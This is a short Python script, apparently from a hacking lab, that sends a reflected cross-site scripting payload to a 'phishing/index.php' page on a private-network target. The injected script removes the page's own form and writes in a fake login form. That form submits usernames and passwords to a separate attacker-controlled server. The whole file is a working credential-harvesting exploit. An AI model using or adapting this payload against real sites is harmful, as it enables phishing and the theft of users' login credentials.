import requests

url = "http://10.129.173.70/phishing/index.php"
params = {
	"url": "'><script>document.write('<h3>Please login to continue</h3><form action=http://10.10.14.114/phishing_server.php><input type=\"username\" name=\"username\" placeholder=\"Username\"><input type=\"password\" name=\"password\" placeholder=\"Password\"><input type=\"submit\" name=\"submit\" value=\"Login\"></form>');document.getElementById('urlform').remove();</script><!--"	
}

r = requests.get(url, params=params)
# print(r.headers)
print(r.url)